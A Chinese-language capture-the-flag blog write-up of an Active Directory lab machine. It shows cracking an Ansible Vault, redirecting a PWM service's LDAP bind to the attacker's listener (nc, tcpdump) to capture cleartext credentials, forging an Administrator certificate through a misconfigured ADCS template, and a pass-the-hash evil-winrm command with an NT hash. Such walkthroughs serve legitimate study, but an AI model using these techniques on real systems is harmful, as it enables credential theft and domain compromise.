发表于2026-06-09|更新于2026-06-17|HackTheBoxActive Directory

一.信息收集

扫描端口

8443端口为http，进去发现是https，web服务是pwm，暂时没方向,搜索发现是一个面向 LDAP 目录的开源密码自助服务应用，添加到/etc/hosts中

https://github.com/pwm-project/pwm 可以在github上找到这个开源项目

用guest进行枚举发现Development可读，查看一下,发现刚刚的PWM服务

发现一个文件，发现main.yaml

查看defaults里的main.yml,下载到本地，发现多个Ansible Vault加密，

用ansible2John爆破密码

得到Ansible Vault的密码 !@#$%^&*


得到密码，尝试一下网站，登陆成功

发现可以进行ldap连接，我们kali上起监听 sudo nc -lvnp 389
并同时抓包 sudo tcpdump -i tun0 -nn -s0 -A port 389 sudo nc -lvnp 389
让对方向我们做 LDAP Simple Bind，从明文流量里抓到凭据

配置改成ldap://10.10.16.13:389，然后进行连接

得到密码

枚举发现易受攻击的模版:CorpVPN,查看其具体配置

https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf 具体原理查看
条件:

  1. 低权限用户/组有注册证书权限
  2. 管理员审批被禁用
  3. 不需要授权签名
  4. 证书模板 DACL 里允许低权限主体注册 看权限是AUTHORITY.HTB\Domain Computers 要先一个机器账户，然后利用账户申请 CorpVPN 模板，并把 UPN 伪造成 Administrator 得到administrator.pfx，使用该证书进行认证 得到管理员的hash，hash传递
    evil-winrm -i 10.129.164.154 -u Administrator -H 6961f422924da90a6928197429eea4ed
